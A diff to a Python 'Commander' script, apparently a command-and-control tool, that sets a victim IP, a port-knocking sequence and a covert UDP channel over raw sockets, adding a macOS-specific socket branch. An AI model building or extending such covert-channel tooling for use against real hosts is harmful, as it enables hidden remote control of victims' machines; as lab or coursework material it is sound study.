@@ -1,10 +1,11 @@
 import os
+import platform
 import socket
 import struct
 import time
 
 # Commander configuration
-VICTIM_IP = "192.168.1.100"  # Target victim IP address (change as appropriate)
+VICTIM_IP = "192.168.1.4"  # Target victim IP address (change as appropriate)
 KNOCK_SEQUENCE = [12345, 23456, 34567]  # Port knocking sequence (example)
 COVERT_UDP_PORT = 40000  # The UDP port on victim used for covert channel
 
@@ -40,8 +41,12 @@ class Commander:
 
     def start_covert_channel(self):
         """Initialize the raw socket for covert communication."""
-        # Create raw socket for IP (protocol will be set per packet in send)
-        self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
+        # Create a raw socket for IP (protocol will be set per packet in send)
+        if platform.system() == "Darwin":
+            proto = socket.IPPROTO_RAW
+        else:
+            proto = socket.IPPROTO_UDP
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, proto)
         self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
         # Optional: We could bind to a specific interface or local IP if needed.
         # Set a timeout for receiving to avoid blocking indefinitely
